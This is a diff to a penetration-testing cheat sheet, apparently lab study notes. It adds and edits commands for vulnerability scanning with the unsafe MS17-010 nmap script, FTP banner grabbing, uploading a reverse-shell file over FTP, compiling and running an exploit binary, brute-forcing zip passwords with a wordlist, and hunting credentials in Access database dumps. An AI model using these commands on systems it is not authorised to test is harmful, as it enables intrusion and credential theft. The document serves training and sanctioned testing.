@@ -16,20 +16,23 @@ $ ls -l /usr/share/nmap/scripts/*ssh*
 $ nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.31
 ```
 
-Apache server not working properly? Try use:
+Kali Apache server not working properly? Try use:
 `$ python -m SimpleHTTPServer 8080`
 
 ## SERVICES
 
 __FTP (21)__
 
-Fingerprint FTP server:
+Fingerprint / access FTP server:
 * `nc 10.11.1.125 21`
 * telnet 10.11.1.125
-
-Access Telnet via. URL:
 * ftp://10.11.1.125
 
+Get / Put files:
+```
+ftp> get [ filename ]
+ftp> put reverse-shell.txt
+```
 
 __SSH (22)__
 
@@ -326,4 +329,21 @@ $ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
 $ wine exploit.exe
 ```
 
+### OTHER THINGS
 
+__ZIP Files__
+
+Brute-force passworded zips:
+```
+$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' passwords.zip
+```
+
+Microsoft Acccess .mdb files:
+```
+# Hexdump
+$ mdb-hexdump database.mdb > hexdump.txt
+
+# Upload hexdump to online reader + search "admin" "password" etc.
+https://www.onlinehexeditor.com
+https://hexed.it
+```
